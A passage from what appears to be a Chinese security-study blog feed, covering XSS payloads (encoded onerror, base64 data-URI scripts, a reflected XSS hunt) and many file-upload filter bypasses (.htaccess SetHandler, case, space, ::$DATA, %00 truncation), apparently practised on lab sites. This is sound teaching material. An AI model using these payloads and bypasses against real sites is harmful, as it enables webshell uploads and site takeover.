src="x"onerror="&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>使用伪协议 base64 解码执行 xss</p><pre class="line-numbers language-none"><code class="language-none">&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;111&lt;/a&gt;&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h2><p>我们搭建一个站，在上面挖掘xss</p><p><img src="/2021/09/22/day29/image-20210927155802805.png" alt="image-20210927155802805"></p><h3 id="反射性XSS挖掘"><a href="#反射性XSS挖掘" class="headerlink" title="反射性XSS挖掘"></a>反射性XSS挖掘</h3><p>1.寻找用户能够输入，在客户端可控的输入点。</p><p>2.输入恶意参数后，能够原型输出，输入没有过滤恶意代码。</p><p>我们寻找能够控制的输入点，我们首先在url上下手，构造一个参数</p><p><img src="/2021/09/22/day29/image-20211020144001227.png" alt="image-20211020144001227"></p><p>我们尝试闭合a标签后构造语句</p><pre class="line-numbers language-none"><code class="language-none">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入到url后无变化，猜测被过滤了</p><p><img src="/2021/09/22/day29/image-20211020144150565.png" alt="image-20211020144150565"></p><p>查看源码后发现果然被过滤了</p><p><img src="/2021/09/22/day29/image-20211020144231451.png" alt="image-20211020144231451"></p><p>这里我们是吧语句插入到了参数里，经过尝试发现当参数语句一起出现时会被过滤，我们直接构造语句不使用参数发现不被过滤</p><p><img src="/2021/09/22/day29/image-20211020144447711.png" alt="image-20211020144447711"></p><p><img src="/2021/09/22/day29/image-20211020144521856.png" alt="image-20211020144521856"></p><p>这是第一个反射xss</p><p>接下来我们继续寻找</p><p><img src="/2021/09/22/day29/image-20211020145017223.png" alt="image-20211020145017223"></p><p>点击这里后，我们又发现了一个可控参数</p><p><img src="/2021/09/22/day29/image-20211020145103699.png" alt="image-20211020145103699"></p><p>我们在源码中查看，发现了他的位置</p><p><img src="/2021/09/22/day29/image-20211020145200315.png" alt="image-20211020145200315"></p><p>想要利用我们首先得闭合，但是这里发现单引号双引号都被转义了，无法闭合</p><p><img src="/2021/09/22/day29/image-20211020145521690.png" alt="image-20211020145521690"></p><p>这里也不能删除参数，不太能利用</p><p>我们继续寻找</p><p><img src="/2021/09/22/day29/image-20211020150652592.png" alt="image-20211020150652592"></p><p>这里有个登录，我们抓包看看</p><p><img src="/2021/09/22/day29/image-20211020150948574.png" alt="image-20211020150948574"></p><p><img src="/2021/09/22/day29/image-20211020151213053.png" alt="image-20211020151213053"></p><p><img src="/2021/09/22/day29/image-20211020151227215.png" alt="image-20211020151227215"></p><p>成功弹窗了</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2021/09/19/day28/"/>
      <url>/2021/09/19/day28/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><span id="more"></span><h2 id="简单认识"><a href="#简单认识" class="headerlink" title="简单认识"></a>简单认识</h2><p>文件上传就是上传脚本到服务器解析执行，获取网站控制权</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。</p><p>如常见的头像上传，图片上传，oa 办公文件上传，媒体上传，允许用户上传文件，如果过滤不严格，恶意用户利用文件上传漏洞，上传有害的可以执行脚本文件到服务器中，可以获取服务器的权限，或进一步危害服务器。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>非法用户可以上传的恶意文件控制整个网站，甚至是控制服务器，这个恶意脚本文件，又被称为 webshell，上传 webshell 后门 很方便地查看服务器信息，查目录，执行系统命令等。</p><h3 id="文件上传过程"><a href="#文件上传过程" class="headerlink" title="文件上传过程"></a>文件上传过程</h3><p>客户端 ：</p><p>选择发送的文件-&gt;服务器接收-&gt;网站程序判断-&gt;临时文件-&gt;移动到指定的路径</p><p>服务器 ：</p><p>接收的资源程序</p><p>服务器接收资源的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br /&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Upload: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br /&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Type: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br /&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Size: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br /&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Stored in: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端文件上传的代码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Filename:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="上传返回"><a href="#上传返回" class="headerlink" title="上传返回"></a>上传返回</h3><p>文件上传时会返回一些代码，返回客户端，客户端根据这些值判断上传是否正常</p><ul><li><p>值：0; </p><p>没有错误发生，文件上传成功。</p></li><li><p>值：1; </p><p>上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。</p></li><li><p>值：2; </p><p>上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。</p></li><li><p>值：3; </p><p>文件只有部分被上传。</p></li><li><p>值：4; </p><p>没有文件被上传。</p></li></ul><h3 id="文件上传漏洞-1"><a href="#文件上传漏洞-1" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞分为 直接文件上传，这种漏洞类型是属于高危漏洞的一种，能直接 getshell，而且没有任何限制，攻击者很容易通过上传点，获取网站的控制权限。</p><p>另外一种是有条件的上传漏洞，这种漏洞一般是开发者经验不足，对文件上传做了简单的限制，如简单的前端认证，文件头文件检测，这种检测行为，可以完全绕过的。</p><p>另外一个方面就是权限认证没处理，没有对文件上传页面进行权限认证，匿名者就能访问上传文件，上传网页后门到网站目录，控制整个网站。</p><p>还有一些上传逻辑有问题，导致文件上传可以被绕过，上传后门到网站上。</p><p>有的文件上传漏洞则是通过中间件或者系统特性上传可以被服务器解析脚本文件，从而导致网站可被控制。</p><p><img src="/2021/09/19/day28/image-20210920102112727.png" alt="image-20210920102112727"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。 </li><li>文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。</li><li>设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传</li><li>限制上传的后缀名，一定要设置成图片格式如 jpg png gif</li><li>修复中间件漏洞</li><li>禁止客户端存在可控参数</li></ul><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>寻找测试网站的文件上传的模块，常见的头像上传，修改上传，文件编辑器中文件上传，图片上传、媒体上传等，通过抓包上传恶意的文件进行测试，上传后缀名 asp php aspx 等的动态语言脚本，查看上传时的返回信息，判断是否能直接上传，如果不能直接上传，再进行测试上传突破，例如上传文件的时候只允许图片格式的后缀，但是修改文件时，却没有限制后缀名，图片文件可以修改成动态语言格式如 php，则可能访问这个文件的 URL 直接 getshell，可以控制网站。</p><h2 id="常见的网站文件后缀名"><a href="#常见的网站文件后缀名" class="headerlink" title="常见的网站文件后缀名"></a>常见的网站文件后缀名</h2><p>可执行脚本的文件后缀名，可被网站目录解析。以下是常见的后缀名</p><ul><li>asp</li><li>asa</li><li>cdx</li><li>cer</li><li>php</li><li>aspx</li><li>ashxjsp</li><li>php3</li><li>php.a</li><li>shtml</li><li>phtml</li></ul><p>有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名。</p><ul><li>aspasp asaspp</li><li>phpphp</li></ul><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>危害极大，如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限，甚至进一步权限提升，控制服务器。</p><p><strong>代码分析</strong></p><p><img src="/2021/09/19/day28/image-20210920104931946.png" alt="image-20210920104931946"></p><p>获取文件名，把上传的临时文件移动到hackable/uploads/目录下</p><p><strong>利用</strong></p><p>直接上传文件，网页返回路径信息</p><p><img src="/2021/09/19/day28/image-20210920105143742.png" alt="image-20210920105143742"></p><p>访问路径</p><p>上传的php文件被执行了</p><p><img src="/2021/09/19/day28/image-20210920105218696.png" alt="image-20210920105218696"></p><h2 id="绕过前端JS检测上传"><a href="#绕过前端JS检测上传" class="headerlink" title="绕过前端JS检测上传"></a>绕过前端JS检测上传</h2><p>在文件上传时，用户选择文件时或者提交时，有些网站会对前端文件名进行验证，一般检测后缀名是否为上传的格式。如果上传的格式不对，则弹出提示文字。</p><p>此时数据包并没有提交到服务器，只是在客户端通过 js 文件进行校验，验证不通过则不会提交到服务器进行处理。</p><p><img src="/2021/09/19/day28/image-20210920110356919.png" alt="image-20210920110356919"></p><p><strong>俩种绕过js检测方法</strong></p><ul><li>按 F12 使用网页审计元素，把校验的上传文件后缀名文件删除，即可上传。 </li><li>把恶意文件改成 js 允许上传的文件后缀，如 jpg、gif、png 等，再通过抓包工具抓取 post 的数据包，把后缀名改成可执行的脚本后缀如 php 、asp、jsp、net 等。即可绕过上传。</li></ul><p><strong>第一种：</strong></p><p><img src="/2021/09/19/day28/image-20210920110901937.png" alt="image-20210920110901937"></p><p><img src="/2021/09/19/day28/image-20210920111019980.png" alt="image-20210920111019980"></p><p><strong>第二种：</strong></p><p><img src="/2021/09/19/day28/image-20210920120628367.png" alt="image-20210920120628367"></p><p><img src="/2021/09/19/day28/image-20210920120734423.png" alt="image-20210920120734423"></p><p>即可绕过</p><p><strong>前端JS检测代码分析</strong>：</p><p><img src="/2021/09/19/day28/image-20210920121905998.png" alt="image-20210920121905998"></p><h2 id="绕过content-type检测上传"><a href="#绕过content-type检测上传" class="headerlink" title="绕过content-type检测上传"></a>绕过content-type检测上传</h2><p>有些上传模块，会对 http 的类型头进行检测，如果是图片类型，允许上传文件到服务器，否则返回上传失败。</p><p>服务端是通过 content-type 判断类型，content-type 在客户端可被修改。则此文件上传也有可能被绕过的风险。</p><p><strong>分析content-type代码</strong></p><p><img src="/2021/09/19/day28/image-20210920123007542.png" alt="image-20210920123007542"></p><p>首先进行submit提交判断，然后允许规定的格式上传</p><p><strong>利用：</strong></p><p><a href="https://www.runoob.com/http/http-content-type.html">https://www.runoob.com/http/http-content-type.html</a></p><p><img src="/2021/09/19/day28/image-20210920123902360.png" alt="image-20210920123902360"></p><p><img src="/2021/09/19/day28/image-20210920123937896.png" alt="image-20210920123937896"></p><p><img src="/2021/09/19/day28/image-20210920124130044.png" alt="image-20210920124130044"></p><h2 id="绕过黑名单上传"><a href="#绕过黑名单上传" class="headerlink" title="绕过黑名单上传"></a>绕过黑名单上传</h2><p>上传模块，有时候会写成黑名单限制，在上传文件的时获取后缀名，再把后缀名与程序中黑名单进行检测，如果后缀名在黑名单的列表内，文件将禁止文件上传。</p><p><strong>黑名单代码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920124945553.png" alt="image-20210920124945553"></p><p>上传图片时，如果提示不允许 php、asp 这种信息提示，可判断为黑名单限制，上传黑名单以外的后缀名即可。</p><p>在 iis 里 asp 禁止上传了，可以上传 asa cer cdx 这些后缀，如在网站里允许.net执行，可以上传 ashx 代替 aspx。如果网站可以执行这些脚本，通过上传后门即可获取 webshell。</p><p>在不同的中间件中有特殊的情况，如果在 apache 可以开启 application/x-httpd-php，在 AddType application/x-httpd-php .php .phtml .php3后缀名为 phtml 、php3 均被解析成 php 有的 apache 版本默认就会开启。上传目标中间件可支持的环境的语言脚本即可，如.phtml、php3。</p><p><img src="/2021/09/19/day28/image-20210920125450769.png" alt="image-20210920125450769"></p><p><img src="/2021/09/19/day28/image-20210920125539198.png" alt="image-20210920125539198"></p><h2 id="htaccess重写解析绕过上传"><a href="#htaccess重写解析绕过上传" class="headerlink" title=".htaccess重写解析绕过上传"></a>.htaccess重写解析绕过上传</h2><p>上传模块，黑名单过滤了所有的能执行的后缀名,如果允许上传.htaccess,也可进行绕过</p><blockquote><p>.htaccess</p><p>文件的作用是 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定 IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。</p><p>在 htaccess 里写入 SetHandler application/x-httpd-php 则可以文件重写成 php 文 件。</p></blockquote><p>要 htaccess 的规则生效 则需要在 apache 开启 rewrite 重写模块，因为 apache是多数都开启这个模块，所以规则一般都生效。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920130027903.png" alt="image-20210920130027903"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">黑名单<span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们先上传含有phpinfo的jpg，发现并未被解析为php，然后我们上传.htaccess，再次访问jpg发现被解析为php了</p><p>.htaccess</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch "jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/09/19/day28/image-20210920131134054.png" alt="image-20210920131134054"></p><p>上传.htaccess后成功解析为php</p><p><img src="/2021/09/19/day28/image-20210920131146170.png" alt="image-20210920131146170"></p><p>fck编辑器通过此方法</p><h2 id="大小写绕过上传"><a href="#大小写绕过上传" class="headerlink" title="大小写绕过上传"></a>大小写绕过上传</h2><p>有的上传模块 后缀名采用黑名单判断，但是没有对后缀名的大小写进行严格判断，导致可以更改后缀大小写可以被绕过。如 PHP、 Php、 phP、pHp</p><p><strong>分析源码：</strong></p><p><img src="/2021/09/19/day28/image-20210920131445342.png" alt="image-20210920131445342"></p><p>这个黑名单里还加了.htaccess</p><p>既然少了这个函数，那我们显然是可以进行大小写绕过</p><p><img src="/2021/09/19/day28/image-20210920131811493.png" alt="image-20210920131811493"></p><p><img src="/2021/09/19/day28/image-20210920131841935.png" alt="image-20210920131841935"></p><h2 id="空格绕过上传"><a href="#空格绕过上传" class="headerlink" title="空格绕过上传"></a>空格绕过上传</h2><p>在上传模块里采用黑名单过滤，如果没有对空格进行过滤有可能被绕过</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920132120986.png" alt="image-20210920132120986"></p><p>既然少了trim这个函数，我们可以通过给文件名前后加上空格进行绕过</p><p><img src="/2021/09/19/day28/image-20210920132725136.png" alt="image-20210920132725136"></p><p><img src="/2021/09/19/day28/image-20210920132752988.png" alt="image-20210920132752988"></p><p>可以看到上传成功并且作为php解析</p><h2 id="利用windows系统特征绕过上传"><a href="#利用windows系统特征绕过上传" class="headerlink" title="利用windows系统特征绕过上传"></a>利用windows系统特征绕过上传</h2><p>在 windows 中，文件后缀名. 系统会自动忽略.，所以 shell.php. 和 shell.php 的效果一样。所以可以在文件名后缀加上.绕过。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920133124158.png" alt="image-20210920133124158"></p><p>既然少了这个函数我们显然可以通过给末尾增加.的方式绕过</p><p><img src="/2021/09/19/day28/image-20210920133240894.png" alt="image-20210920133240894"></p><p><img src="/2021/09/19/day28/image-20210920133313854.png" alt="image-20210920133313854"></p><h2 id="NTFS交换数据流-DATA绕过上传"><a href="#NTFS交换数据流-DATA绕过上传" class="headerlink" title="NTFS交换数据流::$DATA绕过上传"></a>NTFS交换数据流::$DATA绕过上传</h2><p>如果后缀名没有对：：$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920141121292.png" alt="image-20210920141121292"></p><p>我们在文件后缀后加上::$DATA即可绕过</p><p>这里俩个冒号的含义是创建并写入内容，如果只是一个冒号只会创建文件，并不会写入内容</p><blockquote><p>这里我上传是显示上传出错，查看上传地方发现文件没有被上传，我把冒号换成中文才能上传成功，但是无法作为php解析</p><p>正常情况下可以上传成功，去掉::$DATA即可看到phpinfo的内容</p></blockquote><blockquote><p>经过研究发现是php版本的问题，原来是php5.2版本，换为php5.4之后可以正常操作</p></blockquote><p><img src="/2021/09/19/day28/image-20210920150038023.png" alt="image-20210920150038023"></p><p><img src="/2021/09/19/day28/image-20210920152544768.png" alt="image-20210920152544768"></p><p><img src="/2021/09/19/day28/image-20210920153009380.png" alt="image-20210920153009380"></p><h2 id="利用Windows环境的叠加特征绕过上传"><a href="#利用Windows环境的叠加特征绕过上传" class="headerlink" title="利用Windows环境的叠加特征绕过上传"></a>利用Windows环境的叠加特征绕过上传</h2><p>在 windwos 中如果上传文件名 moonsec.php:.jpg 的时候，会在目录下生产空白的文件名 moonsec.php，再利用 php 和 windows 环境的叠加属性，</p><p>以下符号在正则匹配时相等</p><p>双引号” 等于 点号. </p><p>大于符号&gt; 等于 问号?</p><p>小于符号&lt; 等于 星号*</p><p>文件名.&lt;或文件名.&lt;&lt;&lt;或文件名.&gt;&gt;&gt;或文件名.&gt;&gt;&lt;空文件名</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920151003491.png" alt="image-20210920151003491"></p><p><strong>利用：</strong></p><p><img src="/2021/09/19/day28/image-20210920153131378.png" alt="image-20210920153131378"></p><p>查看上传处发现创建了一个空的1.php</p><p><img src="/2021/09/19/day28/image-20210920153207388.png" alt="image-20210920153207388"></p><p><img src="/2021/09/19/day28/image-20210920153245278.png" alt="image-20210920153245278"></p><p>查看上传地方，发现1.php内容被写入了</p><p><img src="/2021/09/19/day28/image-20210920153306045.png" alt="image-20210920153306045"></p><h2 id="双写后缀名绕过上传"><a href="#双写后缀名绕过上传" class="headerlink" title="双写后缀名绕过上传"></a>双写后缀名绕过上传</h2><p>在上传模块，有的代码会把黑名单的后缀名替换成空，例如 a.php 会把 php 替换成空，但是可以使用双写绕过例如 asaspp，pphphp，即可绕过上传。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920153656711.png" alt="image-20210920153656711"></p><p><img src="/2021/09/19/day28/image-20210920153830281.png" alt="image-20210920153830281"></p><p><img src="/2021/09/19/day28/image-20210920153915807.png" alt="image-20210920153915807"></p><h2 id="目录可控-00截断绕过上传"><a href="#目录可控-00截断绕过上传" class="headerlink" title="目录可控%00截断绕过上传"></a>目录可控%00截断绕过上传</h2><p>以上都是一些黑名单被绕过的，如果黑名单上传检测后，没有限定后缀名，绕过的方法很多</p><p>与黑名单相对的就是白名单，使用白名单验证会相对比较安全，因为只允许指定的文件后缀名。</p><p>但是如果有可控的参数目录，也存在被绕过的风险。</p><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210920154517269.png" alt="image-20210920154517269"></p><p>上传参数可控</p><ul><li>当 gpc 关闭的情况下，可以用%00 对目录或者文件名进行截断。</li><li>php 版本小于 5.3.4</li></ul><p>首先上传一个jpg文件抓包修改</p><p><img src="/2021/09/19/day28/image-20210920160327417.png" alt="image-20210920160327417"></p><p><img src="/2021/09/19/day28/image-20210920160406227.png" alt="image-20210920160406227"></p><p><img src="/2021/09/19/day28/image-20210920160415340.png" alt="image-20210920160415340"></p><p>可以看到上传了一个1.php</p><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p><img src="/2021/09/19/day28/image-20210920160623133.png" alt="image-20210920160623133"></p><p>上传jpg文件抓包修改</p><p><img src="/2021/09/19/day28/image-20210920161128240.png" alt="image-20210920161128240"></p><p>因为post上传提交的话需要进行url编码再给服务器，所以我们把%00进行url decode在提交</p><p><img src="/2021/09/19/day28/image-20210920161307068.png" alt="image-20210920161307068"></p><p>查看上传点上传成功了</p><p><img src="/2021/09/19/day28/image-20210920161356998.png" alt="image-20210920161356998"></p><h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" 